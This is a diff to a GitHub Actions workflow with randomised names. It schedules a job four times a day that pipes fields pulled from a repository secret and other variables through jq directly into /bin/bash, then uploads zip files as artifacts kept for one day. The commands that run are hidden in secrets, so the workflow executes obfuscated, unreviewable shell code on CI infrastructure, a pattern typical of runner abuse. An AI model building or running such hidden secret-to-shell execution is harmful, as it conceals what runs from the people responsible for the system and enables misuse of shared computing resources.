@@ -1,21 +1,25 @@
 name: victoriamonolith276
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '54 1/6 * * *'
 
+  schedule:
+    - cron: '18 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: victoriamonolith276
         env:
-          ecxp3: ${{ secrets.ecxp3 }}
+          c453: ${{ secrets.c453 }}
         run: |
-          echo $ecxp3 | jq -r .efet5 | /bin/bash
-          echo $ccr8 | jq -r .yalo17 | /bin/bash
-          echo $r576 | jq -r .bqhbd9611 | /bin/bash
-          echo $uz91711 | jq -r .a5724 | /bin/bash
+          printf '%s' "$c453" | jq -r .d36716 | /bin/bash
+          echo $d49056 | jq -r .tjq1 | /bin/bash
+          echo $yuet2 | jq -r .nbv3344 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: cl8w2QnV
+          path: "*.zip"
+          retention-days: 1
